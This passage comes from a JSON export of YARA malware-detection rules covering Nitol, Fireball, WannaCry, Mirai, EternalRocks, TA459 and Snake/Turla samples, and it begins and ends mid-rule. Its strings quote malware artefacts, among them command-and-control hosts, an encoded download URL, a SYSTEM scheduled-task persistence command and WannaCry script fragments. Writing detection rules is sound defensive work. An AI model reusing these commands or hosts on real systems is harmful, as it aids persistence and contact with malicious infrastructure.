strings:\n      $x1 = \"User-Agent:Mozilla/4.0 (compatible; MSIE %d.00; Windows NT %d.0; MyIE 3.01)\" fullword ascii\n      $x2 = \"User-Agent:Mozilla/4.0 (compatible; MSIE %d.0; Windows NT %d.1; SV1)\" fullword ascii\n      $x3 = \"TCPConnectFloodThread.target = %s\" fullword ascii\n      $s1 = \"\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\" fullword ascii\n      $s2 = \"%c%c%c%c%c%c.exe\" fullword ascii\n      $s3 = \"GET %s%s HTTP/1.1\" fullword ascii\n      $s4 = \"CCAttack.target = %s\" fullword ascii\n      $s5 = \"Accept-Language: zh-cn\" fullword ascii\n      $s6 = \"jdfwkey\" fullword ascii\n      $s7 = \"hackqz.f3322.org:8880\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 5 of ( $s* ) ) ) or ( all of them )\n}","date":"2017-06-04 11:19:41","description":"Detects malware backdoor Nitol - file wyawou.exe - Attention: this rule also matches on Upatre Downloader","minimum_yara":"1.7","name":"Backdoor_Nitol_Jun17_RID2E8F","reference":"https://goo.gl/OOB3mH","required_modules":[],"rule_hash":"5d207e77c56ebc6b53574b09bd29c83b","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Fireball_regkey_RID2D18 : APT DEMO EXE FILE T1113 {\n   meta:\n      description = \"Detects Fireball malware - file regkey.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/4pTkGQ\"\n      date = \"2017-06-02 10:17:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1113\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\WinMain\\\\Release\\\\WinMain.pdb\" fullword ascii\n      $s2 = \"ScreenShot\" fullword wide\n      $s3 = \"WINMAIN\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them )\n}","date":"2017-06-02 10:17:11","description":"Detects Fireball malware - file regkey.exe","minimum_yara":"1.7","name":"Fireball_regkey_RID2D18","reference":"https://goo.gl/4pTkGQ","required_modules":[],"rule_hash":"4ce88b3bed7db607d8b633b087dc5761","score":75,"tags":["APT","DEMO","EXE","T1113","FILE"]},{"author":"Florian Roth","content":"rule Fireball_de_svr_RID2D14 : APT DEMO EXE FILE T1085 {\n   meta:\n      description = \"Detects Fireball malware - file de_svr.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/4pTkGQ\"\n      date = \"2017-06-02 10:16:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd.exe /c MD \" fullword ascii\n      $s2 = \"rundll32.exe \\\"%s\\\",%s\" fullword wide\n      $s3 = \"http://d12zpbetgs1pco.cloudfront.net/Weatherapi/shell\" fullword wide\n      $s4 = \"C:\\\\v3\\\\exe\\\\de_svr_inst.pdb\" fullword ascii\n      $s5 = \"Internet Connect Failed!\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 4 of them )\n}","date":"2017-06-02 10:16:31","description":"Detects Fireball malware - file de_svr.exe","minimum_yara":"1.7","name":"Fireball_de_svr_RID2D14","reference":"https://goo.gl/4pTkGQ","required_modules":[],"rule_hash":"4918450cab0b95753a56a0cb7195a85d","score":75,"tags":["APT","T1085","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule Fireball_lancer_RID2D06 : APT DEMO EXE FILE T1085 {\n   meta:\n      description = \"Detects Fireball malware - file lancer.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/4pTkGQ\"\n      date = \"2017-06-02 10:14:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\instlsp\\\\Release\\\\Lancer.pdb\" ascii\n      $x2 = \"lanceruse.dat\" fullword wide\n      $s1 = \"Lancer.dll\" fullword ascii\n      $s2 = \"RunDll32.exe \\\"\" fullword wide\n      $s3 = \"Micr.dll\" fullword wide\n      $s4 = \"AG64.dll\" fullword wide\n      $s5 = \"\\\",Start\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or 3 of ( $s* ) ) ) or ( 6 of them )\n}","date":"2017-06-02 10:14:11","description":"Detects Fireball malware - file lancer.dll","minimum_yara":"1.7","name":"Fireball_lancer_RID2D06","reference":"https://goo.gl/4pTkGQ","required_modules":[],"rule_hash":"7105126cbe2804bc84e4ebd80aca5292","score":75,"tags":["APT","T1085","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule QQBrowser_RID2A97 : APT DEMO EXE FILE {\n   meta:\n      description = \"Not malware but suspicious browser - file QQBrowser_RID2A97.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/4pTkGQ\"\n      date = \"2017-06-02 07:03:21\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"TerminateProcessWithoutDump\" fullword ascii\n      $s2 = \".Downloader.dll\" fullword wide\n      $s3 = \"Software\\\\Chromium\\\\BrowserCrashDumpAttempts\" fullword wide\n      $s4 = \"QQBrowser_RID2A97_Broker.exe\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them )\n}","date":"2017-06-02 07:03:21","description":"Not malware but suspicious browser - file QQBrowser.exe","minimum_yara":"1.7","name":"QQBrowser_RID2A97","reference":"https://goo.gl/4pTkGQ","required_modules":[],"rule_hash":"3a8add557b5d4287bea9f3fc41eab8dc","score":50,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule chrome_elf_RID2B25 : APT DEMO EXE FILE T1053 T1085 {\n   meta:\n      description = \"Detects Fireball malware - file chrome_elf_RID2B25.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/4pTkGQ\"\n      date = \"2017-06-02 08:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1053, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x2 = \"schtasks /Create /SC HOURLY /MO %d /ST 00:%02d:00 /TN \\\"%s\\\" /TR \\\"%s\\\" /RU \\\"SYSTEM\\\"\" fullword wide\n      $s6 = \"aHR0cDovL2R2Mm0xdXVtbnNndHUuY2xvdWRmcm9udC5uZXQvdjQvZ3RnLyVzP2FjdGlvbj12aXNpdC5jaGVsZi5pbnN0YWxs\" fullword ascii\n      $s7 = \"QueryInterface call failed for IExecAction: %x\" fullword ascii\n      $s10 = \"%s %s,Rundll32_Do %s\" fullword wide\n      $s13 = \"Failed to create an instance of ITaskService: %x\" fullword ascii\n      $s16 = \"Rundll32_Do\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 4 of them )\n}","date":"2017-06-02 08:54:01","description":"Detects Fireball malware - file chrome_elf.dll","minimum_yara":"1.7","name":"chrome_elf_RID2B25","reference":"https://goo.gl/4pTkGQ","required_modules":[],"rule_hash":"db765df357ecc7380951d7dfb85b6b01","score":75,"tags":["DEMO","T1053","FILE","APT","T1085","EXE"]},{"author":"Florian Roth","content":"rule Fireball_winsap_RID2D23 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Fireball malware - file winsap.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/4pTkGQ\"\n      date = \"2017-06-02 10:19:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"aHR0cDovL2\" ascii\n      $s2 = \"%s\\\\svchost.exe -k %s\" fullword wide\n      $s3 = \"\\\\SETUP.dll\" fullword wide\n      $s4 = \"WinSAP.dll\" fullword ascii\n      $s5 = \"Error %u in WinHttpQueryDataAvailable.\" fullword ascii\n      $s6 = \"UPDATE OVERWRITE\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 4 of them )\n}","date":"2017-06-02 10:19:01","description":"Detects Fireball malware - file winsap.dll","minimum_yara":"1.7","name":"Fireball_winsap_RID2D23","reference":"https://goo.gl/4pTkGQ","required_modules":[],"rule_hash":"01f4e60dca3447848ab83446e64cba83","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Fireball_archer_RID2D06 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Fireball malware - file archer.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/4pTkGQ\"\n      date = \"2017-06-02 10:14:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\archer_lyl\\\\Release\\\\Archer_Input.pdb\" fullword ascii\n      $s1 = \"Archer_Input.dll\" fullword ascii\n      $s2 = \"InstallArcherSvc\" fullword ascii\n      $s3 = \"%s_%08X\" fullword wide\n      $s4 = \"d\\\\\\\\.\\\\PhysicalDrive%d\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( $x1 or 3 of them )\n}","date":"2017-06-02 10:14:11","description":"Detects Fireball malware - file archer.dll","minimum_yara":"1.7","name":"Fireball_archer_RID2D06","reference":"https://goo.gl/4pTkGQ","required_modules":[],"rule_hash":"cd994c2a3ab39a0f0d1fbcb077060253","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule clearlog_RID2A5A : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects Fireball malware - file clearlog_RID2A5A.dll\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/4pTkGQ\"\n      date = \"2017-06-02 05:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\ClearLog\\\\Release\\\\logC.pdb\" ascii\n      $s1 = \"C:\\\\Windows\\\\System32\\\\cmd.exe /c \\\"\\\"\" fullword wide\n      $s2 = \"logC.dll\" fullword ascii\n      $s3 = \"hhhhh.exe\" fullword wide\n      $s4 = \"ttttt.exe\" fullword wide\n      $s5 = \"Logger Name:\" fullword ascii\n      $s6 = \"cle.log.1\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and $x1 or 2 of them )\n}","date":"2017-06-02 05:21:41","description":"Detects Fireball malware - file clearlog.dll","minimum_yara":"1.7","name":"clearlog_RID2A5A","reference":"https://goo.gl/4pTkGQ","required_modules":[],"rule_hash":"71bb3c680d745046d2304dbf0f316d4c","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Fireball_gubed_RID2C98 : APT DEMO EXE FILE T1183 {\n   meta:\n      description = \"Detects Fireball malware - file gubed.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/4pTkGQ\"\n      date = \"2017-06-02 09:55:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1183\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\MRT.exe\" fullword wide\n      $x2 = \"tIphlpapi.dll\" fullword wide\n      $x3 = \"http://%s/provide?clients=%s&reqs=visit.startload\" fullword wide\n      $x4 = \"\\\\Gubed\\\\Release\\\\Gubed.pdb\" fullword ascii\n      $x5 = \"d2hrpnfyb3wv3k.cloudfront.net\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them )\n}","date":"2017-06-02 09:55:51","description":"Detects Fireball malware - file gubed.exe","minimum_yara":"1.7","name":"Fireball_gubed_RID2C98","reference":"https://goo.gl/4pTkGQ","required_modules":[],"rule_hash":"0bed0b435e60cb9373242d586178830e","score":75,"tags":["APT","DEMO","EXE","T1183","FILE"]},{"author":"Florian Roth","content":"rule TA459_Malware_May17_1_RID2DEE : DEMO FILE MAL {\n   meta:\n      description = \"Detects TA459 related malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/RLf9qU\"\n      date = \"2017-05-31 10:52:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"xtsewy\" fullword ascii\n      $s6 = \"CW&mhAklnfVULL\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6152 and filesize < 800KB and all of them )\n}","date":"2017-05-31 10:52:51","description":"Detects TA459 related malware","minimum_yara":"1.7","name":"TA459_Malware_May17_1_RID2DEE","reference":"https://goo.gl/RLf9qU","required_modules":[],"rule_hash":"1873db263183fe132c6b0dc6a4509572","score":75,"tags":["DEMO","FILE","MAL"]},{"author":"Florian Roth","content":"rule TA459_Malware_May17_2_RID2DEF : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects TA459 related malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/RLf9qU\"\n      date = \"2017-05-31 10:53:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"Mcutil.dll\" fullword ascii\n      $a2 = \"mcut.exe\" fullword ascii\n      $s1 = \"Software\\\\WinRAR SFX\" fullword ascii\n      $s2 = \"AYou may need to run this self-extracting archive as administrator\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of ( $a* ) and 1 of ( $s* ) )\n}","date":"2017-05-31 10:53:01","description":"Detects TA459 related malware","minimum_yara":"1.7","name":"TA459_Malware_May17_2_RID2DEF","reference":"https://goo.gl/RLf9qU","required_modules":[],"rule_hash":"e54af08137beca67bdf30509009cb44d","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EternalRocks_taskhost_FR_RID30A5 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects EternalRocks Malware - file taskhost.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/stamparm/status/864865144748298242\"\n      date = \"2017-05-18 12:48:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"EternalRocks.exe\" fullword wide\n      $s1 = \"sTargetIP\" fullword ascii\n      $s2 = \"SERVER_2008R2_SP0\" fullword ascii\n      $s3 = \"20D5CCEE9C91A1E61F72F46FA117B93FB006DB51\" fullword ascii\n      $s4 = \"9EBF75119B8FC7733F77B06378F9E735D34664F6\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 15000KB and 1 of ( $x* ) or 3 of them )\n}","date":"2017-05-18 12:48:41","description":"Detects EternalRocks Malware - file taskhost.exe","minimum_yara":"1.7","name":"EternalRocks_taskhost_FR_RID30A5","reference":"https://twitter.com/stamparm/status/864865144748298242","required_modules":[],"rule_hash":"3021c23324fe2302bdb41aa15b837b4f","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule EternalRocks_svchost_FR_RID303E : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects EternalRocks Malware - file taskhost.exe\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/stamparm/status/864865144748298242\"\n      date = \"2017-05-18 12:31:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WczTkaJphruMyBOQmGuNRtSNTLEs\" fullword ascii\n      $s2 = \"svchost.taskhost.exe\" fullword ascii\n      $s3 = \"ConfuserEx v\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 2 of them )\n}","date":"2017-05-18 12:31:31","description":"Detects EternalRocks Malware - file taskhost.exe","minimum_yara":"1.7","name":"EternalRocks_svchost_FR_RID303E","reference":"https://twitter.com/stamparm/status/864865144748298242","required_modules":[],"rule_hash":"eb541e855c60ff59d778dc864d472225","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Docm_in_PDF_RID2B03 : DEMO FILE SUSP {\n   meta:\n      description = \"Detects an embedded DOCM in PDF combined with OpenAction\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-05-15 08:48:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = /<<\\/Names\\[\\([\\w]{1,12}.docm\\)/ ascii\n      $a2 = \"OpenAction\" ascii fullword\n      $a3 = \"JavaScript\" ascii fullword\n   condition: \n      uint32 ( 0 ) == 0x46445025 and all of them\n}","date":"2017-05-15 08:48:21","description":"Detects an embedded DOCM in PDF combined with OpenAction","minimum_yara":"1.7","name":"Docm_in_PDF_RID2B03","reference":"Internal Research","required_modules":[],"rule_hash":"8591203da3bb272c29e9b084e9db1b4b","score":75,"tags":["SUSP","DEMO","FILE"]},{"author":"Florian Roth","content":"rule WannaCry_RansomNote_RID2E99 : CRIME DEMO FILE MAL RANSOM {\n   meta:\n      description = \"Detects WannaCry Ransomware Note\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/HG2j5T\"\n      date = \"2017-05-12 11:21:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CRIME, DEMO, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"A:  Don't worry about decryption.\" fullword ascii\n      $s2 = \"Q:  What's wrong with my files?\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x3a51 and filesize < 2KB and all of them )\n}","date":"2017-05-12 11:21:21","description":"Detects WannaCry Ransomware Note","minimum_yara":"1.7","name":"WannaCry_RansomNote_RID2E99","reference":"https://goo.gl/HG2j5T","required_modules":[],"rule_hash":"533239936565763106cdb41b0df37155","score":75,"tags":["DEMO","CRIME","RANSOM","FILE","MAL"]},{"author":"Florian Roth","content":"rule Mirai_1_May17_RID2B81 : DEMO FILE MAL {\n   meta:\n      description = \"Detects Mirai Malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-05-12 09:09:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GET /bins/mirai.x86 HTTP/1.0\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 5000KB and all of them )\n}","date":"2017-05-12 09:09:21","description":"Detects Mirai Malware","minimum_yara":"1.7","name":"Mirai_1_May17_RID2B81","reference":"Internal Research","required_modules":[],"rule_hash":"53074ec45242535a8b3d844800d7209a","score":75,"tags":["DEMO","FILE","MAL"]},{"author":"Florian Roth (based on rule by US CERT)","content":"rule WannaCry_Ransomware_Gen_RID302B : CRIME DEMO EXE FILE GEN MAL RANSOM {\n   meta:\n      description = \"Detects WannaCry Ransomware\"\n      author = \"Florian Roth (based on rule by US CERT)\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-132A\"\n      date = \"2017-05-12 12:28:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CRIME, DEMO, EXE, FILE, GEN, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"__TREEID__PLACEHOLDER__\" fullword ascii\n      $s2 = \"__USERID__PLACEHOLDER__\" fullword ascii\n      $s3 = \"Windows for Workgroups 3.1a\" fullword ascii\n      $s4 = \"PC NETWORK PROGRAM 1.0\" fullword ascii\n      $s5 = \"LANMAN1.0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them\n}","date":"2017-05-12 12:28:21","description":"Detects WannaCry Ransomware","minimum_yara":"1.7","name":"WannaCry_Ransomware_Gen_RID302B","reference":"https://www.us-cert.gov/ncas/alerts/TA17-132A","required_modules":[],"rule_hash":"350882850aa0264087686aafcabc111e","score":80,"tags":["RANSOM","MAL","DEMO","EXE","FILE","GEN","CRIME"]},{"author":"Florian Roth","content":"rule WannCry_m_vbs_RID2C49 : CRIME DEMO FILE MAL RANSOM SCRIPT {\n   meta:\n      description = \"Detects WannaCry Ransomware VBS\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/HG2j5T\"\n      date = \"2017-05-12 09:42:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CRIME, DEMO, FILE, MAL, RANSOM, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \".TargetPath = \\\"C:\\\\@\" ascii\n      $x2 = \".CreateShortcut(\\\"C:\\\\@\" ascii\n      $s3 = \" = WScript.CreateObject(\\\"WScript.Shell\\\")\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x4553 and filesize < 1KB and all of them )\n}","date":"2017-05-12 09:42:41","description":"Detects WannaCry Ransomware VBS","minimum_yara":"1.7","name":"WannCry_m_vbs_RID2C49","reference":"https://goo.gl/HG2j5T","required_modules":[],"rule_hash":"7c9f066f546a35bd791670c63fa29f80","score":75,"tags":["RANSOM","SCRIPT","MAL","DEMO","FILE","CRIME"]},{"author":"Florian Roth","content":"rule WannCry_BAT_RID2B09 : CRIME DEMO FILE MAL RANSOM {\n   meta:\n      description = \"Detects WannaCry Ransomware BATCH File\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/HG2j5T\"\n      date = \"2017-05-12 08:49:21\"\n      score = 100\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"CRIME, DEMO, FILE, MAL, RANSOM\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"@.exe\\\">> m.vbs\" ascii\n      $s2 = \"cscript.exe //nologo m.vbs\" fullword ascii\n      $s3 = \"echo SET ow = WScript.CreateObject(\\\"WScript.Shell\\\")> \" ascii\n      $s4 = \"echo om.Save>> m.vbs\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x6540 and filesize < 1KB and 1 of them )\n}","date":"2017-05-12 08:49:21","description":"Detects WannaCry Ransomware BATCH File","minimum_yara":"1.7","name":"WannCry_BAT_RID2B09","reference":"https://goo.gl/HG2j5T","required_modules":[],"rule_hash":"8c2743895ec9c21d4cb4ddd16be53678","score":100,"tags":["DEMO","CRIME","RANSOM","FILE","MAL"]},{"author":"Florian Roth","content":"rule Miari_2_May17_RID2B82 : DEMO FILE MAL {\n   meta:\n      description = \"Detects Mirai Malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-05-12 09:09:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36\" fullword ascii\n      $s2 = \"GET /g.php HTTP/1.1\" fullword ascii\n      $s3 = \"https://%[^/]/%s\" fullword ascii\n      $s4 = \"pass\\\" value=\\\"[^\\\"]*\\\"\" fullword ascii\n      $s5 = \"jbeupq84v7.2y.net\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 5000KB and 2 of them )\n}","date":"2017-05-12 09:09:31","description":"Detects Mirai Malware","minimum_yara":"1.7","name":"Miari_2_May17_RID2B82","reference":"Internal Research","required_modules":[],"rule_hash":"2cb0aafa06ccb1aa700af48af986162e","score":75,"tags":["DEMO","FILE","MAL"]},{"author":"Florian Roth","content":"rule SnakeTurla_Malware_May17_1_RID30B1 : DEMO FILE MAL RUSSIA {\n   meta:\n      description = \"Detects Snake / Turla Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QaOh4V\"\n      date = \"2017-05-04 12:50:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/Users/vlad/Desktop/install/install/\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0xfacf and filesize < 200KB and all of them )\n}","date":"2017-05-04 12:50:41","description":"Detects Snake / Turla Sample","minimum_yara":"1.7","name":"SnakeTurla_Malware_May17_1_RID30B1","reference":"https://goo.gl/QaOh4V","required_modules":[],"rule_hash":"e64ab97dfe01aaa1af4aa873848ca267","score":75,"tags":["DEMO","RUSSIA","FILE","MAL"]},{"author":"Florian Roth","content":"rule SnakeTurla_Malware_May17_3_RID30B3 : DEMO FILE MAL RUSSIA {\n   meta:\n      description = \"Detects Snake / Turla Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QaOh4V\"\n      date = \"2017-05-04 12:51:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Addy Symonds1\" ascii\n      $x2 = \"com.addy.InstallAdobeFlash\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0xfacf and filesize < 3000KB and all of them )\n}","date":"2017-05-04 12:51:01","description":"Detects Snake / Turla Sample","minimum_yara":"1.7","name":"SnakeTurla_Malware_May17_3_RID30B3","reference":"https://goo.gl/QaOh4V","required_modules":[],"rule_hash":"d11143ddb82de91d69ef8c575a1b8b35","score":75,"tags":["DEMO","RUSSIA","FILE","MAL"]},{"author":"Florian Roth","content":"rule SnakeTurla_Malware_May17_4_RID30B4 : DEMO FILE MAL RUSSIA {\n   meta:\n      description = \"Detects Snake / Turla Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QaOh4V\"\n      date = \"2017-05-04 12:51:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Install Adobe Flash Player.app/com.adobe.updatePK\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x4b50 and filesize < 5000KB and all of them )\n}","date":"2017-05-04 12:51:11","description":"Detects Snake / Turla Sample","minimum_yara":"1.7","name":"SnakeTurla_Malware_May17_4_RID30B4","reference":"https://goo.gl/QaOh4V","required_modules":[],"rule_hash":"4dae54c925ce8a1b61002b9100dc0310","score":75,"tags":["DEMO","RUSSIA","FILE","MAL"]},{"author":"Florian Roth","content":"rule SnakeTurla_Installd_SH_RID2F9F : DEMO FILE MAL RUSSIA {\n   meta:\n      description = \"Detects Snake / Turla Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/QaOh4V\"\n      date = \"2017-05-04 12:05:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"PIDS=`ps cax | grep installdp\" ascii\n      $s2 = \"${SCRIPT_DIR}/installdp ${FILE}\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and all of them )\n}","date":"2017-05-04 12:05:01","description":"Detects Snake / Turla Sample","minimum_yara":"1.7","name":"SnakeTurla_Installd_SH_RID2F9F","reference":"https://goo.gl/QaOh4V","required_modules":[],"rule_hash":"076d333c251302f0dc3b97c0ab2a75fd","score":75,"tags":["DEMO","RUSSIA","FILE","MAL"]},{"author":"Florian Roth","content":"rule SnakeTurla_Install_SH_RID2F3B : DEMO FILE MAL RUSSIA {\n   meta:\n      description 